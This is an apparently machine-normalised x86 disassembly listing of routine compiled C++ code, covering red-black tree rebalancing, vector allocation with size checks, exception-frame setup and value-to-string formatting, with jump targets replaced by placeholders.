mov cl [ edx + 0x2d ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401e80
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x74 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x2d ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x2c ]
mov al [ edi + 0x2c ]
mov [ edi + 0x2c ] dl
mov [ ebx + 0x2c ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esi + 0x24 ]
add esi 0xc
cmp eax 0x10
pop ebp
pop ebx
jb r-xdata
mov ecx [ edi + 0x4 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x18 ]
mov cl [ eax + 0x2c ]
mov edi [ esp + 0x14 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x2d ]
test al al
je r-xdata
push ebp
call sub_432860
mov ecx [ esp + 0x18 ]
add esp 0x4
mov eax esi
jmp r-xdata
lea eax [ esp + 0xb ]
push eax
mov ecx esi
mov [ esi + 0x18 ] 0xf
mov [ esp + 0xf ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_4010a0
push eax
call sub_401010
mov ecx [ esp + 0x18 ]
push ecx
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0xc
test eax eax
jbe r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ ebp + 0x2c ] bl
cmp [ ebp + 0x2c ] bl
jne r-xdata
push ebp
call sub_432840
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x58 ]
pop edi
mov [ eax ] edx
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x5c
retn 0x8
dec eax
mov [ edi + 0x8 ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x2c ]
test cl cl
jne r-xdata
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
call sub_40b000
mov eax [ esi ]
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov [ eax + 0x2c ] bl
push esi
mov ecx edi
mov [ esi + 0x2c ] 0x0
call sub_40afa0
mov eax [ esi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x2c ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x2c ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
je r-xdata
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40b000
mov edx [ eax + 0x8 ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40afa0
mov eax [ esi ]
mov [ eax + 0x2c ] 0x0
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40afa0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40b000
mov eax [ esi + 0x8 ]
sub_40c380
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x2d ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_40c380
mov esi [ esi ]
mov ecx edi
call sub_4480b0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x2d ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_40c3c0
push 0xffffffff
push sub_4beeb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov edx [ esp + 0x34 ]
push ebx
xor ebx ebx
mov eax edx
push esi
mov [ esp + 0x8 ] ebx
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x14 ]
call sub_401e80
mov eax [ esp + 0x40 ]
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x3c ] ebx
call sub_4018c0
mov esi [ esp + 0x38 ]
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov ecx [ esp + 0x28 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_40c470
push ebp
mov ebp esp
push 0xffffffff
push sub_4beee1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x1c
jmp r-xdata
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push edi
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_401dd0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_40c4d6
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_401f90
add esi 0x1c
cmp esi edi
jne r-xdata
sub_40c510
mov edx [ ecx ]
mov eax edx
sub esp 0x108
cmp eax 0x5
jg r-xdata
sub eax 0x6
cmp eax 0x6
ja r-xdata
je r-xdata
cmp edx 0xd
jb r-xdata
jmp [ eax * 4 + jump_table_40c93c ]
mov al [ esp + 0x110 ]
test al al
je r-xdata
cmp eax 0x1
jg r-xdata
push 0xffffffff
add ecx 0x8
push 0x0
push ecx
mov ecx [ esp + 0x118 ]
call sub_401dd0
add esp 0x108
retn 0x8
cmp edx 0x80000000
jae r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
call sub_4aa1d0
jmp r-xdata
sub eax 0x2
je r-xdata
je r-xdata
call sub_4aa660
mov ecx [ esp + 0x10c ]
push eax
call sub_402510
add esp 0x108
retn 0x8
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa2f0
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa4a0
mov ecx [ esp + 0x10c ]
push eax
call sub_402510
add esp 0x108
retn 0x8
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa0f0
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa150
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa080
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa0a0
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa1b0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x10c ]
sub eax edx
push eax
push r--data
call sub_401e80
add esp 0x108
retn 0x8
push eax
lea ecx [ esp + 0xc ]
push r--data
push ecx
call sub_4b675e
add esp 0xc
jmp r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
dec eax
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
cmp eax 0x80000002
jg r-xdata
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa410
mov ecx [ esp + 0x10c ]
push eax
call sub_402510
add esp 0x108
retn 0x8
mov al [ esp + 0x110 ]
test al al
je r-xdata
dec eax
jne r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa0e0
jmp r-xdata
test eax eax
jne r-xdata
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x10c ]
sub eax edx
push eax
lea eax [ esp + 0xc ]
push eax
call sub_401e80
add esp 0x108
retn 0x8
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa500
jmp r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
mov al [ esp + 0x110 ]
test al al
je r-xdata
call sub_40a5e0
sub esp 0x8
fstp [ esp ]
lea edx [ esp + 0x10 ]
push r--data
push edx
call sub_4b675e
add esp 0x10
lea eax [ esp + 0x8 ]
push eax
call [ lstrlenA@IAT ]
dec eax
js r-xdata
cmp eax 0x80000000
je r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
lea eax [ esp ]
push eax
call sub_4aa550
mov eax [ eax ]
jmp r-xdata
mov ecx [ esp + 0x10c ]
push r--data
call sub_402510
add esp 0x108
retn 0x8
call sub_4aa0c0
jmp r-xdata
test eax eax
mov ecx eax
jl r-xdata
mov cl 0x30
lea ecx [ ecx ]
call sub_40a4d0
movzx eax al
test eax eax
jne r-xdata
cmp eax 0x80000001
jne r-xdata
lea eax [ esp + eax + 0x8 ]
mov dl 0x2e
lea esp [ esp ]
dec eax
jns r-xdata
push r--data
lea edx [ esp + 0xc ]
push edx
push r--data
lea ecx [ esp + 0xc ]
push ecx
jmp r-xdata
call sub_40a510
jmp r-xdata
dec ecx
jns r-xdata
cmp [ eax ] dl
je r-xdata
cmp [ esp + eax + 0x8 ] cl
jne r-xdata
call [ lstrcpyA@IAT ]
cmp [ esp + ecx + 0x8 ] dl
jne r-xdata
jmp r-xdata
mov [ eax ] 0x0
inc eax
sub_40c960
sub esp 0x100
push esi
mov esi ecx
movsx eax [ esi ]
cmp eax 0x62
mov [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
cmp eax 0x66
je r-xdata
push r--data
lea ecx [ esp + 0x8 ]
push ecx
push r--data
lea eax [ esp + 0x8 ]
push eax
jmp r-xdata
fld [ esi + 0x4 ]
sub esp 0x8
fstp [ esp ]
lea eax [ esp + 0xc ]
push r--data
push eax
call sub_4b675e
add esp 0x10
lea ecx [ esp + 0x4 ]
push ecx
call [ lstrlenA@IAT ]
dec eax
js r-xdata
cmp eax 0x69
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edx [ esp + 0x4 ]
push eax
lea ecx [ esi + 0x8 ]
push edx
call sub_401e80
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
test eax eax
mov ecx eax
jl r-xdata
mov cl 0x30
lea esp [ esp ]
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x4 ]
push eax
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call sub_4b675e
lea eax [ esp + 0x10 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea eax [ esi + 0xc ]
pop esi
add esp 0x100
retn
mov eax [ esi + 0xc ]
pop esi
add esp 0x100
retn
lea eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea eax [ esp + eax + 0x4 ]
mov dl 0x2e
dec eax
jns r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
dec ecx
jns r-xdata
cmp [ eax ] dl
je r-xdata
cmp [ esp + eax + 0x4 ] cl
jne r-xdata
cmp [ esp + ecx + 0x4 ] dl
jne r-xdata
mov [ eax ] 0x0
inc eax
sub_40ca80
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_40bc20
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_40cac0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x7fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax + eax ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cb10
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x1fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 8 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cb70
push esi
xor eax eax
push edi
mov edi [ esp + 0xc ]
cmp edi eax
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0xffffffff
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
push edi
call sub_4b573e
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
add esp 0x4
add eax edi
mov [ esi + 0xc ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cbc0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0xccccccc
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax + eax * 4 ]
shl edi 0x2
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cc20
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x1999999
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax + eax * 4 ]
shl edi 0x5
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cc80
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x3fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 4 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_40bf80
sub_40cce0
push ebp
mov ebp esp
push 0xffffffff
push sub_4beef8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x63
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov ecx [ eax ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edi
mov edx [ esi + 0x4 ]
test edx edx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
xor eax eax
jmp r-xdata
inc [ ecx + 0x4 ]
cmp [ ebp - 0x24 ] 0x63
mov [ ebp - 0x4 ] 0xffffffff
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
je r-xdata
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x3
xor edi edi
jmp r-xdata
dec [ edi + 0x4 ]
jne r-xdata
test edx edx
jne r-xdata
mov ecx esi
call sub_40bf80
mov ebx 0x1fffffff
sub ebx edi
cmp ebx ecx
jae r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx + 0x14 ]
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax ecx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi ecx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] ebx
shl ecx 0x3
mov eax ebx
sub eax ecx
mov edx esp
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0xc ] eax
mov [ edx ] eax
call sub_40bc80
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_40b7c0
add esp 0x10
lea eax [ ebp - 0x24 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ ecx * 8 ]
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x1c ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x1c ] esp
mov [ eax ] edi
call sub_40bc80
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x24 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_40bd20
mov ebx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x24 ]
add ebx eax
mov [ esi + 0x8 ] ebx
push ecx
mov esi ebx
push ecx
mov ecx esp
sub esi eax
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_40b600
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi edx
sar edi 0x3
xor edi edi
jmp r-xdata
test edx edx
jne r-xdata
shl eax 0x3
push eax
mov [ ebp - 0x18 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov edi eax
mov eax [ esi + 0x4 ]
push esi
push edi
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x1c ] edi
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_417b90
mov edx [ ebp + 0xc ]
add esp 0x14
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x24 ]
push ecx
push edx
push ebx
mov [ ebp + 0x10 ] ebx
call sub_417720
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ ebx + eax * 8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_417b90
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
test edx edx
jne r-xdata
add edi ecx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax edi
lea ecx [ edi + ebx * 8 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edi
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push esi
push eax
push ecx
call sub_40bc20
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
mov ebx [ ebp + 0xc ]
add ebx eax
test ecx ecx
je r-xdata
add eax ecx
mov edi [ ebp - 0x20 ]
sub_40d000
push ebp
mov ebp esp
push 0xffffffff
push sub_4bef10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_40bf80
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
